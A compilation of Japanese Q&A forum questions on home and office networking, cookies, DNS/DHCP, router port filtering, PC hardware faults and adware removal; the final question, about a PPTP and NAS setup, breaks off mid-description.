(A) webサーバー側の設定によって、cookieにパソコンのMACアドレス、コンピュータ名、フルコンピュータ名、またはパソコン内に存在するファイル名を記録させることは出来るのでしょうか？ (B) セッションcookie がwebサーバーから与えられる時には、ドメインの指定も備わっているため、セッションcookieは同時にファーストパーティーの形態を取り、[ファーストパーティの Cookie をブロックする]設定にしていると セッションcookie もブロックすると考えていたのですが Internet Explorer で、[ファーストパーティの Cookie をブロックする][常にセッション Cookie を許可する]状態でyahooメールにログインできました。 なぜでしょうか？ http://itpro.nikkeibp.co.jp/article/COLUMN/20080 … セッションcookieにはドメイン指定があると書いてあります (1. Webアプリケーションが、Set-Cookie: NAME=VALUE; expires=DATE; path=PATH; domain=DOMAIN_NAME; secure (NAME=VALUEのみ必須)という形式のHTTPヘッダーを含めて、レスポンスを返す。) (C) http://blog.tokumaru.org/2013/02/purpose-and-imp … ログインには[BASIC認証]と[フォーム認証]がありますが、ログアウトした場合、[BASIC認証]ではパソコン内に保存されたcookieは削除されず、[フォーム認証]では削除されるのでしょうか？ (D) http://blog.tokumaru.org/2013/02/purpose-and-imp … [フォーム認証]では、パソコン内のcookieにはセッションIDが保存されるだけだとありますが、googleや楽天のような大手ではなく、小さなショッピングサイトの中には[フォーム認証]でもcookieにIDとパスワードを保存するところがあるのでしょうか？ それとも、そもそも[フォーム認証]では、cookieにIDとパスワードを保存できない、または出来るとしても今は保存するサイトはまず無いと考えてよいのでしょうか？ (E) yahooやgoogleのログイン画面では、[ログインしたままにする][ログイン状態を保持する]というチェックボックスがあります。 このチェックボックスにチェックを入れてログインすると、cookieにはセッションIDではなく、IDとパスワードが保存されることになるのでしょうか？ (A)(B)(C)(D)(E)について教えてください。
WHR-G301Nを2階で使用してましたが1階で電波が弱いため同機種を入手しました。新しく入手したものは子機のようなものですか？エアーステーションツールでは元の親機しか認識できません。AOSSで、うまく接続できていないのでしょうか？
1. WinXPのパソコンにUbuntuをインストールします。 2. 上記UbuntuにWin7をインストールします。 専門業者に依頼してWinXPに復元してもらうことは可能でしょうか？ ご存知の方、宜しくお願いします。
PS3を有線で繋ぎたいです ですが親機と直接と繋ぐのは無理です。(家の都合上) なので親機→ルーター→(有線)→PS3 が理想なのですが親機に触れないのでルーターの設定ができないと思います。 PCをルーター替わりにするみたいな事はできないのでしょうか？ 親機→(無線)→PC→(有線)→PS3のように繋ぎたいのですが無理でしょうか？
先月ぐらいから回線が定期的に切れます。 色々調べましたが、原因が分かりません。 ルーターのログを見ると切断された時間にこのように書き込まれています。 2013年7月30日 0:07:46 OLS PPPoE start to dial-up 2013年7月30日 0:07:46 PADI4 sent 2013年7月30日 0:07:46 PADO4 recv 801 2013年7月30日 0:07:46 PADR4 sent 2013年7月30日 0:07:46 PADS4 recv 8002 9E 2013年7月30日 0:07:47 CHAP(4): OK 2013年7月30日 0:07:47 IPCP4: IP is 219.75.202 2013年7月30日 0:07:47 IPCP4: DNS0 is 60.56.0. 2013年7月30日 0:07:47 IPCP4: DNS1 is 60.56.0 2013年7月30日 0:07:49 OLS PPPoE(4) hang-up 2013年7月30日 0:07:49 PADT4 sent 2013年7月30日 0:07:49 ServicePPPoE start to dial-up 2013年7月30日 0:07:49 PADI3 sent 2013年7月30日 0:07:49 PADO3 recv 801 2013年7月30日 0:07:49 PADR3 sent 2013年7月30日 0:07:50 PADS3 recv 8002　E81 2013年7月30日 0:07:50 DOD:UDP trigger from 192.168.0.15:1535 to 65.55.42.183:374 2013年7月30日 0:07:50 DOD:TCP trigger from 192.168.0.20:5077 to 157.56.59.199:80 2013年7月30日 0:07:50 CHAP(3): O 2013年7月30日 0:07:50 IPCP3: IP is 58.190.88.29 2013年7月30日 0:07:50 IPCP3: DNS0 is 60.56.0.35 2013年7月30日 0:07:50 IPCP3: DNS1 is 218.21.89.134 2013年7月30日 0:07:51 OLS PPPoE start to dial-up 2013年7月30日 0:07:51 PADI4 sent 2013年7月30日 0:07:51 PADO4 recv 806 2013年7月30日 0:07:51 PADR4 sent 2013年7月30日 0:07:51 PADS4 recv 8002 B30 2013年7月30日 0:07:51 CHAP(4): OK 2013年7月30日 0:07:51 IPCP4: IP is 219.75.202.2 2013年7月30日 0:07:51 IPCP4: DNS0 is 0.56.0.15 2013年7月30日 0:07:51 IPCP4: DNS1 is 60.5.0.15 2013年7月30日 0:07:53 Syn Time: Tue Jul 30 00:07:4 2013 2013年7月30日 0:07:58 OLS PPPoE(4) hang-up 2013年7月30日 0:07:58 PADT4 sent ここに原因が表示されてるか分かる方いればお願いします。 PC　と　ゲーム機をインターネットに接続すると切れます。片方だけなら切れません。 消す必要はないかもしれませんが、ログの数字は怖いので少し消してます。
LAN内にDNSサーバーを置き、DNSによってDNSサーバーに問い合わせてLAN内のパソコンの名前を解決するときに、LAN内にドメイン名を設定しておく事は必須なのでしょうか？ ホスト名、ドメイン名の用語の定義は ホスト名＋ドメイン名=FQDN とします。 ワークグループは使用しません。 LAN内にはDNSサーバーと3台のパソコンがあり、 各パソコンの ホスト名 と プライベートIPアドレス は [ホスト名] [プライベートIPアドレス] taro 192.168.100.2 jiro 192.168.100.3 saburo 192.168.100.4 とします。 そして、DNSサーバーのDNSレコードに　A 形式を用い taro IN A 192.168.100.2 jiro IN A 192.168.100.3 saburo IN A 192.168.100.4 と記述します。 DNSサーバー内の記述は、ホスト名＋ドメイン名=FQDNの形式を備えておらず、ドメイン名に関する記述が欠けたホスト名だけでも問題ないのでしょうか？ (LAN内にドメイン名が存在しなくてもLAN内のパソコンからホスト名だけでDNSサーバーへ問い合わせると名前解決ができるのでしょうか？) それともDNSサーバーには、様式として[ホスト名＋ドメイン名]と[IPアドレス]の組み合わせの形式のみ登録ができ、DNSサーバー内にドメイン名に関する記述がない[ホスト名]と[IPアドレス]の組み合わせの形式ではDNSサーバーに登録できず、ホスト名だけでの問い合わせがあっても名前解決はできないのでしょうか？
宜しくお願いします。 既存のプライベートNWへ新規LANを構築したいのですが、その際にWANで利用可能なセグメントを設けることができないと管理者に言われました。 そうなるとLANはローカルセグメントで構築した場合、WANへのアクセスは上位にルーターを設けることで可能と分かるのですが、 WANからLAN内機器へのアクセスは可能でしょうか？ LAN内機器は、工場などのFA現場で使用されるシーケンサやタッチパネルなどで、ポート番号を持つ機器と持たない機器があります。 仮にポート番号を持ってる機器でも、全ての機器に別のポートを割り当てることは機器の設定範囲上で困難となります。 何かWANからLAN内機器へのアクセスができる方法が他にありましたらご指導願えますでしょうか？ 宜しくお願いいたします。
質問です。 最近、疑問に思ったのですがインターネットからどこまで個人の情報が得られてしまうのでしょうか? といってもケースバイケースだとは思いますので、具体的に聞きます。 例えば私が掲示板（教えてgooや２ちゃんねる等）にある書き込みをした場合、その書き込みからどこまでの情報を得ることができるのでしょうか？ 管理人なら、法に触れる等の条件は考えないで純粋にできる所までとことんやって、どこまで知ることができてしまうのでしょうか? まったく知られない？地域くらいは知られてしまうのか、はたまた書き込んだ場所自体が特定されてしまうのか… 少し気になっています。詳しい方、どなたか教えていただけないでしょうか?
お世話になります。 以下、質問させてください。 現在、２拠点間で、ヤマハルーター、RTX1100により、IPSecのVPN接続を行っております。 回線はBフレッツ、プロバイダはOCNです。 固定IPアドレスを取得して、インターネット接続では、IPマスカレードを使用しております。 セキュリティを強化するために、不要なポートを可能な限り、さらに閉じたいと思っておりますが、 閉じすぎてしまいますと、正常な通信が、出来なくなってしまいますので、 どのポートを閉じることが出来るかを、検討しております。 WELLKNOWNポート（０～１０２３）については、使用するポート（DNSサーバーの53、WEBの80、443、IPSecの５００、等）以外のポートは、すべて閉じます。また、使用するポートも、IPアドレスによる制御をかけます。 登録済ポート（１０２４～４９１５１）、自由使用ポート（４９１５２～６５５３５）については、特に狙われやすいポートを閉じ、他は、開けてあります。ただし、外部からのアクセスはIPアドレスにより拒否、内部から外部のDNSサーバー、WEBサイトへのアクセスの返答は、通過させるようにしております。 ここで、ご質問させてください。 まず、内部LANから、外部インターネットに接続する場合についてです。 内部LANの端末から、DNSサーバーの５３番ポートへの送信、 DNSサーバーの５３番ポートから、内部LANの端末への受信、を許可していますが、 その際に、こちら側のポートは、１０２４番以降のポート番号が、「任意」に割り当てられる、と、文書で読みました。 このため、１０２４番以降で、閉じているポートが、たまたま割り当てられてしまった場合は、正常な通信が出来なくなってしまいます。 この「任意」には、何らかのルールがありますでしょうか。 例えば、１０２４番から順番に割り当てられるのだとしたら、内部LANの端末数が１００くらいで、また、すべての端末が同時にインターネットを使用する可能性は低いので、１０２４～１１２４ぐらいまでは、開けておき、１１２５～６５５３５は、閉じておきたい、と思います。 外部WEBサイトに接続する場合、やはり、送信側の「任意の」ポートから、外部WEBサイトの８０、４４３ポートに、パケットが送られ、そこから、ESTABLISHEDパケットが、送信側の８０、４４３ポートを通じて（この認識も正しいかどうか、確証がありません）戻ってきて、３WAYハンドシェイクにより、接続が成立する、と理解しております。 この際の「任意」にも、何らかのルールがありますでしょうか。 ルーターRTX１１００のマニュアルを観ますと、IPマスカレードを使っている場合、デフォルトでは、６００００～６４０９５が割り当てられる、と書いてあるのですが、通信ログを観ますと、１０２４番以降の比較的若い番号も、使われているようでして。 もし、このマニュアルの記述が正しいならば、１０２４～５９９９９、６４０９６～６５５３５は、閉じてしまいたいとも、思うのですが。 次に、IPSecについてです。 調べますと、IPSecの共通鍵（IKE）交換は、両拠点の５００番ポート同士で行われる、ということなのですが、それでは、両拠点間の通信は、すべて、この５００番ポート同士のみで、行われるということになりますでしょうか。それとも、１０２４番以降のポートも、やはり、使われる可能性がありますでしょうか。 例えば、片方の拠点のLANにある、データベースサーバー（プライベートIPアドレス、MicrosoftSQLサーバー）を、もう片方の拠点のLANでも、参照、使用しております。 ポートフィルタリングで、SQLServerが使用する、１４３３、１４３４番ポートも、閉じているのですが、２拠点間の通信は、正常に行うことが出来ております。 以上、２つ、お伺いさせて頂きます。 どうぞよろしくお願い致します。
現在、Win98上でどうさしているモデムがあります。 あるソフトからは、TDK DF5614F-J Modem Cardのデバイス（ドライバ？）を 使っているとあるソフト上では、出ていますが、実際にはどのモデムかは 不明です（PCに刺さっているタイプです）。 この場合、全二重モードが利用出来るのか、また、現在、全二重モードなのかを 調べる方法はありますでしょうか？ よろしくお願いいたします。
前に、何かのシステムが入り込んだらしく、セキュリティーを購入しないと、コンピューターが動かなくなりました。そのときは、おかしいなと思いながらも、購入して、問題なく、コンピューターは動きましたが、また、同じことが、半年位でおこりました。 今回は、いろいろ、調べてみましたが、セキュリティーの会社にも行き着くことが出来ないらい、巧妙は、詐欺だったようです。 このシステムを削除する方法をご存知の方がいれば、教えて頂けますか？
環境: 回線はBフレッツのファミリー100でYahooBB経由です。 WindowsXP SP3で、WindowsUpdateは全てあたっている状態です。 自宅PCをDMZにて常時起動し、自分用に動的ドメイン経由でwebやftpサーバーなどを 立ち上げています。 ファイヤウォールは、NortonInternetSecurity2004で、Windowsファイヤウォールは無効 にしています。 症状: ブラウザはFireFoxで、ブラウザアクセスを繰り返していると、突然アクセスできなる症状が発生。 WEBのダウンローダーやオークションツールなどWEB経由のツールを併用している時もありますが、 80ポートへアクセスするもの、80ポートにアクセスするもの(httpd)が、アクセスできなくなります。 この時は、他のポート(DNS,ftp,SMB,VNC,Hamachi,などなど)は全て生きていて、 他のLAN上のPCも問題ありません。 このPCだけが、数十～50ないし100ページ程度の閲覧をすると遮断されたようになり、 再起動すると回復しますが、困っている形です。 状況から、プロバイダや終端装置、ルータやハブなどは問題なく、ファイヤウォールによるもの でもなく、またアクセスページ数は不定で(厳密なリクエスト数の可能性はあるが)、 原因がつかめない状態です。 何か解決方法やヒントなどありましたらお教えいただけないでしょうか。
不正アクセスする人たちって相当頭がいいのでしょうか？ 大企業でも防げないほどの技術を持ってるということですか？
グラボはgtx560ti,cpuはintelcorei72700kです。合う合わないとかわからないので何かアドバイスを頂けると嬉しいです
マザーボード上で58という数字が光っていました。 これはオンボードDebug LEDというものらしいのですが、 biosが、Intelの場合は「USBバスのリセット」という不具合、 PhoenixのBIOSだと「Test for unexpeced interrupt 」のエラー、ということらしいのですが、これらのエラーの意味を教えていただけるととても助かります。 マザーボードが死んだのでしょうか？それとも…
パソコン使用中にいきなり、「ガガガガガ」という異音とともに完全に画面がとまりました。これはフリーズとも違い完全に止まりました。 その後電源を落とし再び起動させようとすると起動自体はしてるようなのですが画面が真っ暗なままbios画面なども一切表示されません。(このときの起動音は普段とやや違う気もします。) 二週間前にも同じことがあり、そのときは、マザーボードのボタン電池を入れ直したら、画面がbios設定画面などに進み無事に使えるようになったのですが、昨日同じように対処したところ、3時間くらいあとに異音とともにパソコンは止まり、電池を入れ直しても今回は画面がつかなくなりました。 昨日はボタン電池を新しくしてみたのですが、まちがえてリチウム電池でなく、アルカリ電池を入れてしまいました。もしかするとそのせいで無理に起動させられて3時間後に限界きたのかもしれません。 今日新しくリチウム電池を買ってきたのですが、相変わらず画面は真っ暗です。 どなたか、原因と対処方法をアドバイスいただければ幸いです。 補足:二週間前はホコリが原因でファンかなにかが物理的に詰まったのかと思って、溜まっていたホコリをエアダスターで掃除しました。 また昨日はグラボのファンの周りを取り囲む配線がファンにぶつかってしまいそうな位置にずれてたのでそれを直しました。 pc詳細ですが、マザーボードはfoxconnのp67a-s-b3、intelのcorei7 2700k ,gtx560ti, メモリは普段十分に余っていたと思います。（多くてcpu使用率10パーセント～20パーセントとか） ファンは上と後ろとグラボとマザーボードとたくさんついてます。 電源は大きめのがついていたはずです。 画面つかない時の内部ですが、マザーボード上で58とかの数字が光っていたのでマザーボードが動きはするようです。（業者に作ってもらったやつなのでどういう意味かわかりませんが二桁の数字の光る電光板がマザーボードについている。）
家庭内で windowsパソコン(LAN)-ルーター-インターネット という環境でネットに接続しています。 ルーターはDHCPサーバーとして機能し、windowsパソコンにプライベートIPアドレスを割り振っています。 ルーター配下のパソコンで ipconfig/all を打ち込むと [プライマリDNSサフィックス]の項目には何も記述がありません。 ホスト名・ドメイン名の用語の定義については、ホスト名＋ドメイン名=FQDN　とします。 (A) ルーターがwindowsパソコンにドメイン名を割り振るには、ルーターにDHCPサーバー機能が必要で、DPCPサーバー機能のオプションとしてドメイン名を割り振る設定を付けることが出来る。 そして、その場合、ルーター配下のパソコンにプライベートIPアドレスを割り振ると同時にドメイン名を割り振っているのでしょうか？ またドメイン名をパソコンに割り振ったとき、ルーターもLAN内で同じドメイン名を持つのでしょうか？ また、その時、ルータのホスト名はどのようになっているのでしょうか？ (B) ルーター配下のパソコンで ipconfig/all の [プライマリDNSサフィックス]に何もなければ、ルーターのDHCPサーバー機能には、パソコンにドメイン名を割り振る機能がないと考えてよいでしょうか？ (C) ルーターのDHCPサーバー機能にドメイン名を割り振る機能がない(パソコンにプライマリDNSサフィックスがない)ケースで、ルーターがwindowsパソコンにプライベートIPアドレスを割り振った時に、windowsパソコンのホスト名とプライベートIPアドレスの組み合わせがDHCPサーバー(ルーター)に保存されるのでしょうか？ (D) ルーターのDHCPサーバー機能にドメイン名を割り振る機能がある(パソコンにプライマリDNSサフィックスがある)ケースで、ルーターがwindowsパソコンにプライベートIPアドレスを割り振った時に、windowsパソコンの(ホスト名＋ドメイン名)と(プライベートIPアドレス)の組み合わせがDHCPサーバー(ルーター)に保存されるのでしょうか？ (E) ipconfig/allの結果を見ると[DNSサーバー]に、ルーターのプライベートIPアドレスが設定されています。 LAN内にドメイン名は設定されていないとします。 ルーターのDNSサーバー機能は、ルーターのDNSサーバーに問い合わせがある場合は、そこで返答せず、すべてプロバイダーのDNSサーバーにつないでいるのでしょうか？ それとも、ルーターのDNSサーバーには、DHCPサーバー機能によってプライベートIPを割り振ったとき(ルーターもプライベートIPを持つ)に、LAN内のパソコンのホスト名とプライベートIPアドレスの組み合わせが保存されていて、LAN内のパソコンからルーターに対して[LAN内のパソコンまたはルーター]に関してDNSまたはNETBIOS経由で問い合わせがあった時は、[LAN内のパソコンまはたルータ]のホスト名、またはプライベートIPアドレスを返す。そして、返すことが出来ない場合はプロバイダーのDNSサーバーにつないでいるのでしょうか？ (F) ipconfig/allの結果を見ると[DNSサーバー]に、ルーターのプライベートIPアドレスが設定されています。 私の環境とは異なりますが、LAN内にドメイン名が設定されているとします。 ルーターのDNSサーバー機能は、ルーターのDNSサーバーに問い合わせがある場合は、そこで返答せず、すべてプロバイダーのDNSサーバーにつないでいるのでしょうか？ それとも、ルーターのDNSサーバーには、DHCPサーバー機能によってプライベートIPを割り振ったとき(ルーターもプライベートIPを持つ)に、LAN内のパソコンの(ホスト名＋ドメイン名)と(プライベートIPアドレス)の組み合わせが保存されていて、LAN内のパソコンからルーターに対して[LAN内のパソコンまたはルーター]に関してDNSまたはNETBIOS経由で問い合わせがあった時は、[LAN内のパソコンまたはルータ]の(ホスト名＋ドメイン名)または(プライベートIPアドレス)を返す。そして、返すことが出来ない場合はプロバイダーのDNSサーバーにつないでいるのでしょうか？ (A)(B)(C)(D)(E)(F)について教えてください。 (E)(F)に関してはDNSサーバーであるルータに問い合わせがあったときに、プロバイダのDNSサーバーにつなげる時と、プロバイダのDNSサーバーにつなげずルーターのDNSサーバーで解決する時の区別がついておりません。
独自SSLを設定できる共有サーバーは独自SSLの各契約者に独自IPアドレスを割り当てているのでしょうか？ IPアドレスを共有する形態の共有サーバーでは独自SSLは入れられませんよね？ 上記の理解で合っていますか？
家庭内で　 パソコン-市販ルータ-インターネット という環境でネットに接続をしています。 パソコンにはプライベートipがルータから割り振られているだけでドメイン名はありません。 パソコンのInternet Explorerの[ローカルエリアネットワーク(LAN)の設定]で 「設定を自動的に検出する」にチェックを入れ、プロキシサーバを自動的に検出するWPADが 有効になっている場合について教えてください。 この場合、 まずはルーター配下のLAN内でWPADが ○DHCP サーバを利用する ○DNSを利用する の2通りの経路でプロキシサーバーを探す。 ○DHCP サーバを利用する パソコンにプライベートIPを割り振りDHCPサーバとして機能している市販のルータには通常プロキシサーバーの設定情報はないので、ここではプロキシサーバーを見つけられない。 ○DNSを利用する ルータを含めたLAN内の端末にはドメイン名がないので、「wpad.<ドメイン名>」を見つけられない。 したがってプロキシサーバーも見つけられない。 結果 ○DHCP サーバを利用する ○DNSを利用する の2つの経路を利用しても、LAN内ではプロキシサーバーを見つけられない。 次にWPADはインターネット上でプロキシサーバを探し出す。 ○プロバイダのDHCP サーバを利用する プロバイダのDHCPサーバには、通常プロキシサーバーの設定情報はないので、ここではプロキシサーバーを見つけられない。 ○プロバイダのDNSを利用する プロバイダが提供するグローバルIPアドレスにはドメイン名があるが、通常は「wpad.<ドメイン名>」をプロバイダは用意していない。 したがって、プロキシサーバーを見つけられない。 結果 ○プロバイダのDHCP サーバを利用する ○プロバイダのDNSを利用する の2つの経路を利用しても、インターネット上ではプロキシサーバーを見つけられない。 以上より、パソコンのInternet Explorerの[ローカルエリアネットワーク(LAN)の設定]で 「設定を自動的に検出する」にチェックを入れ、プロキシサーバを自動的に検出するWPADが 有効になっていても、 LAN内、インターネット上のどちらからもプロキシサーバーを見つけられず、プロキシサーバーの設定はなされない。 このように考えているのですが、正しいでしょうか？ 参考にしたページ http://www.monyo.com/technical/windows/06.html
フォームにSSLを入れても、内容をメールで飛ばす仕様にしたら結局意味ないでしょうか？ 飛ばし先のメールは例えばGmailとかです。
お世話になります。 下記のようなWEB連載を探していますので ご存じの方は教えて頂ければと思います。 ・WEBでの掲載 ・最新のネットワーク技術に関する記載 ・第?回完結型ではなく、最新のネットワーク技術について 　語る連載型 　※最悪完結型でも結構ですが。。。 ・人気のあるサイト 以上宜しくお願い致します。
間違ってアダルトサイトへ登録してしまったようでずっと料金の支払いのポップアップが でdてきて困っております。視聴もしていないのに視聴したと登録の内容が出たりします。 ほっておいてもいいのですが鬱陶しのでサービス期間内に払ったら安くなると書いてありましたがぽポップの画面を含めてどう対処したらいいのか教えていただけますでしょうか？ よろしくお願いいたします。
度々、お世話になります お聞きしたいのですが、通常はセキュリティの中に暗号かされたファイルがある もしくは、暗号化をセキュリティと呼ぶかもしれません セキュリティ自体が暗号化されてるシステムなんて、あるのでしょうか？ よろしくお願いします
JCOMでヒカリを有線で使っているのですが、二階にあるノートPCは無線LANルータを購入して無線で使おうと思っています。 どの無線LANルータを購入すればよいと思いますか？ よいものがありましたら教えてください。 また二階で使えるか？どのようなことに気を付ければよいかなどありましたら教えてください。 最後にもうIEEE802n.11nはもう使えるのでしょうか？
サーバー上で、POP３のトラフィックが激増しました。 これはスパムメールとかを送りつけられているということなのでしょうか。 もし、そうだとしたらこれを回避する方法は １）サーバーでスパム対策を強化する ２）メールアドレスを変更する 以外にないのでしょうか。。。。 スパム対策を強化すると、必要なメールが入ってこないという心配があり メールアドレスを変更すると今まで使っていた人から連絡が来なくなる という懸案事項があります。 一般的にはどのような方法を取られているのか、ご指南いただけると助かります。 どうぞよろしくお願いします、
クラウドでデータがネット上に保存されたとき、そのデータが アメリカ国内にあるサーバーの中に保存されていたら、 持ち主が日本人でも、そのデータはアメリカの法律に従って処理されるのでしょうか？ 日本の法律が適用されれば、憲法21条があるのだが、 アメリカでは愛国者法がある。 クラウドに乗せたとたんに、情報の保護に関する考え方が変わってしまうのでしょうか？ 日本人が外国で犯罪を犯せば、外国の法律で裁かれるのと同様に考えるのでしょうか？ 日本国内にたくさんサーバーを置いて外国の情報を集めて、 外国人所有の情報は誰でも見れるような法律を作ったら日本は得するでしょうか？ なぞです。　よろしくお願いします。
i pod touch4を使っています。 これのサイトにWi-Fiについてかいてあります。 https://support.apple.com/kb/HT5569?viewlocale=j … 『ネットワーク名の左側にチェックマークがつくと、画面左上のステータスバーWi-Fiロゴが表示される』と書いてあります。 ですがチェックマークがついても、Wi-Fiロゴも表示されないし、接続されません。 なぜでしょうか？ 教えて下さい！ また、その解決方法を教えて下さい。
先日、フリーソフトをダウンロードしたところ、Chrome起動時にDeltaSearchというサイトが表示されるようになりました。 また、googleで検索した時や何もしなくても定期的(?)に「スパイウェアを検出　直ちにWindowsをチェックしてください」というような広告が表示されるようになりました。(広告が詐欺であることはわかっています） chromeの設定で、今のところchromeを再起動してもDeltaSearchが表示されないようにはなったのですが、「検索エンジンの管理」でDeltaSearchを消しても再起動したらまた復活していて困っています。 広告のことも含めて、完全に削除する方法はないでしょうか。 (ダウンロードしたフリーソフト、Delta search、DeltaToolbarはウィンドウズから削除したつもりです。レジストリ等のことはあまり理解できていません）
i pod touch4を使っています。 私は今まで普通にWi-Fiを利用していました。 が、わけあって違うWi-Fiを使う事になりました。 ですが今までのようにきちんと接続されません。 touchのWi-Fi設定のネットワーク名のところにチェックマークがつきます。 ですがWi-Fiの電波っぽいマークもつかないし、ネットなども使えません。 なぜでしょう... 新しくしたWi-Fiはパソコンで作った新しいネットワークで、固定回線です。 Wi-Fiを新しくしたのなら再設定をしなくてはならないんでしょうか？ そのやり方も教えて下さい。 Wi-Fiについてよくわからないので、いろいろ教えて下さい！ お願いします。
　PSPをネットワークに接続したら、SSID、BSSID 　が出てきました！？公開したら、まずい事になりますか 　 以上よくわかりません！ 　よろしくお願いします。 　
インターネット回線を２本使用し、利用可能でしょうか。 機種はヤマハRTX810ですが、現在はフレッツ光でRTX810にVPN(ipsec)で接続しています。 nat descriptorでそれぞれを接続していますが、本社接続用VPN(設定変更不可)を 接続し、ルータ機能をLAN1側に設定したく考えています。 ご教授お願いします。
iPhone でツイッターアプリを開くと、“Send crash report?”という英文のメッセージが現れる様になりました。 内容は、「Looks like we crashed ! please help us the problem by sending a crash report.」 選択肢は「Send」 「Always send 」 「Don't send」の三つです。 どれかをpushしないとツイッター画面に入る事ができません。 この現象になる直前に、こんな事がありました。 私はツイッター初心者なのですが、面白い書き込みを見つけたので、知らない人でしたが その人の書き込みをお気に入りに入れたり、リツートやリプライをしていました。 すると、突然画面が白くなったり正常に表示されなくなったのです。 嫌な予感がしている最中、その人が卑猥な文面を書いたのでゾッとして、急遽書き込みを削除 したり、フォローを解除したりしたのです。 その後、電源を入れ直すと一旦は正常な画面に戻ったのですが、数時間後にアプリをタップ すると上記の様なダイアログが出る様になったのです。 この出来事と、その後の英語のダイアログは関係あるのでしょうか？ だとしたらウィルス等で人に迷惑をかけては困ると心配です。 いずれかの選択肢ボタンを押さないと入れないし、何かしら押すとどうにかなるような怖い物 だったら困るので、どうしたらいいのか分かりません。 この現象はどうして起きたのか、私のツイッターはどうすればいいのか、、。 お分かりになる方、よろしくお願いしますm(__)m。
私はアメーバピグをやっています。　なのでピグの動画をとってYutubeに出そうと思うんですが、　パソコンの画面を動画で撮ったら画質悪くなります（ぶれたようになる）　なのでそれをどうにか直したいんですがどうしたら画質が良くなりますか？教えてください！
無料楽器というアプリ（アンドロイド）がセキュリティソフトに検出されました。 https://play.google.com/store/apps/details?id=co … lookoutというセキュリティソフト何ですが ほにゃららを削除しました～のような表示が一瞬され消えてしまいました。 この履歴を見る方法と今後できる限り対策を取りたいのですが 皆様でしたらどうするかお知恵を拝借したく質問させていただきました。 アプリはアンインストールしたのですが 上記アプリページを見ると 個人情報にアクセス、書き換えができると書いてあり 半年くらいインストールしていたので不安で、対策を取りたいと考えております。 ちなみに2週間前から脅威は検出されていたようですが 気がつきませんでした。 このような状況です。 どうぞよろしくお願いいたします。
Googleグループ を使って環境省が国民に情報公開をしていたようです。 設定を変えるようですが、 設定の変更で、Googleの管理者やGoogleに圧力をかけられる人でも、 内容が見れないように出来るのでしょうか？ それとも、そんな設定は出来ないのでしょうか？ もし、情報のコピーがアメリカ国内のサーバーに存在すれば、 アメリカの人は自由に見れるのでしょうか？ いろいろ考えますが、日本のエリート様の考えがなかなか理解できません。 よろしく、お願いします。
最近スパムが多くて困っており、少し伺います。 メール本文が例えば改行しかないなど特定の文字列しかない場合はどのように指定すれば良いのでしょうか？ 正規表現でもかまいません。
http://jbpress.ismedia.jp/articles/-/38177?page=2 によれば、結構たいへんそうですが、 通信の安全を確保する技術は日本にありますか？ それとも、安全な通信は伝令を使う以外には無いのでしょうか？ 日本は暗号技術で世界一になれるでしょうか？ ２番は、１番に盗聴され放題なので、意味がないと思います。 よろしくお願いします。
LAN内に共有領域を設置し、LAN外部からこの共有領域にアクセスできるようにし、 かつLAN外部のPCからこの共有領域に対しネットワークドライブを割り当てる事を めざしています。 実際の使用シーンとしては、友人やグループなどが同一のワードやエクセルファイル に対し、添削や加筆を行う、といったイメージです。 これに関し、関連した質問をさせて頂いたところ、LAN外部のPCがLAN内部の共有領域 に対しネットワークドライブを割り当てる機能を持たせるには、LAN内部にVPNサーバ を設置する必要がある、との事でしたので、現在は以下のようなネットワーク構成に 落ち着きました。 ＜現在のネットワーク構成＞ 　　KDDIホームGW　　ルータ兼PPTPサーバ　　無線LAN AP 192.168.0.1 192.168.0.254 　　192.168.2.XXX 　　┌─────┐　　┌─────┐　　　　┌─────┐ 　　│ 　　　　　　　│　　│　　　　　　　 │　　　 │　　　　　　 　│ 　　│ BL900HW　├─┤ BHR-4GRV├─┬─┤ WR9500N │ 　　│　　　　　　 　│　　│　(DMZ) 　 │　　│　│　　　　　　　│ 　　└─────┘　　└──┬──┘　　│　└─────┘ 　　　　　　　　　　　　　　　　　　　│　　　　　 　│ 　　　　　　　　　　　　　　　┌──┴──┐　　│ 　┌───────┐ 　　　　　　　　　　　　　　　│ USB HDD │　　├─┤ LS-WX4.0TL/R1│ 　　　　　　　　　　　　　　　└─────┘　　│ 　└───────┘ 　　　　　　　　　　　　　　　　　　　　　　　　　　　│　　　　　　BuffaloのNAS 　　　　　　　　　　　　　　　　　　　　　　　　　　　│ 　　　　　　　　　　　　　　　　　　　　　　　　　　　│ 　┌───────┐ 　　　　　　　　　　　　　　　　　　　　　　　　　　　└─┤　自作サーバ　 │ 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　└───────┘ 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　 Webサーバ＆DNSサーバ 　ａｕひかりを使っている関係上、ルーター機能を有するホームＧＷ（ここでは 　BL900HW）が必須なので、２重ルーターになるのですが、Buffalo の BHR-4GRV 　という有線ブロードバンドルータをDMZ領域においています。BHR-4GRV には 　PPTPサーバ機能があるので、これを活用しています。 　BHR-4GRV の USB 端子に USB HDD を接続し、上記の共有領域にはこの HDD を 　割り当てています。 　その後段の NEC の無線ルータ（WR9500N）は、ルータ機能を停止し無線LANの 　アクセスポイントモードに特化した使い方としています。また WR9500N には 　Biglobe DDNS 機能をサポートしているので、PPTPサーバー構築の際の DDNS 　はここで対応しています。 　更に、LAN 内部に自作のホームページ公開用の Web サーバ をおいていますが、 　ここにはホームページにLAN内部からも http:// 形式でアクセスできるように 　LAN 内部用のDNS サーバー機能も持たしています。 ＜現状できているところと解決すべき問題点＞ 　(1)BHR-4GRV の PPTP サーバーの設定で、以下のような設定をする。 　　 この時、LAN外部のPCからは問題無くVPN（PPTP）接続が成功する。 　　　(a)サーバーIPアドレス、クライアントIPアドレスとも「自動設定」にする。 　　　(b)DNSサーバーのIPアドレスは、「ブロードステーションのLAN側IPアドレス」 　　　　 とする。（BHR-4GRV の設定画面では、BHR-4GRV の事をブロードステーション 　　　　 と称している。） 　　　(c)PPTP接続ユーザを１つ作成し、「IPアドレス割り当て方法」を 　　　　「PPTPサーバー設定の範囲から取得」とする。 　(2)BHR-4GRV の 「NAS」設定の「共有フォルダ設定」で、 　　　(d)「アクセス制限機能」は「アクセス制限なし（読取／書込可能）」に設定し、 　　　　「Webアクセス設定」は「アクセス制限を使用する」にチェックを入れる。 　(3)BHR-4GRV の 「NAS」設定の「ユーザー管理」で、 　　　(e) 上記の(c)で作成したものと同じユーザー名＆パスワードで、新しく 　　　　　ユーザー名を作成する。 　(4)BHR-4GRV の 「NAS」設定の「共有サービス」で、 　　　(f) 共有フォルダー機能は「使用する」にチェックを入れる。 　　　　　ブロードステーション名はデフォルトのまま。 　　　　　　